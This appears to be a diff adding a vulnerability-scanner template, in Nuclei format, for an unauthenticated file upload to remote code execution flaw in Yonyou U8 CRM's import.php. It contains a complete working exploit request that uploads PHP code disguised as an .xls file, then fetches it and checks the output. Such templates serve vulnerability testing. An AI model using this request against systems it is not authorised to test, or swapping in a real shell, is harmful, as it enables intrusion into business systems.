@@ -1,0 +1,41 @@
+id: yongyou-U8-CRM-import-files-upload
+
+info:
+  name: 用友U8 CRM import.php 文件上传致RCE漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+  
+http:
+  - raw:
+      - |
+        POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="xfile"; filename="1.xls"
+        
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="combo"
+
+        {{username}}.php
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+      
+      - |
+        GET /tmpfile/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'24642')"
